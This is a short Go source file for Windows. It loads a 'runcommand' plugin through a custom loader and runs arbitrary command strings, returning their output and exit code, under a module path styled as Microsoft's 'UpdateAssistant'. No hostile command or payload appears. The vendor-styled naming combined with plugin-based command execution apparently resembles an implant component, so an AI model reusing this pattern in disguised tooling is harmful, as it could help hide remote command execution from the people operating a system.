//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func runcommand(fn func(*loader.Plugin)) {
	p, err := loader.Load("runcommand")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func RunCommand(cmd, cwd string) ([]byte, int32, error) {
	var out []byte
	var exit int32
	var callErr error
	runcommand(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("run",
			uintptr(unsafe.Pointer(loader.BytePtr(cmd))),
			uintptr(unsafe.Pointer(loader.BytePtr(cwd))),
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(config.CmdBuf),
			uintptr(unsafe.Pointer(&exit)),
		)
		if err != nil {
			callErr = err
			return
		}
		out = buf[:int(n)]
	})
	if callErr != nil {
		return nil, 1, callErr
	}
	return out, exit, nil
}
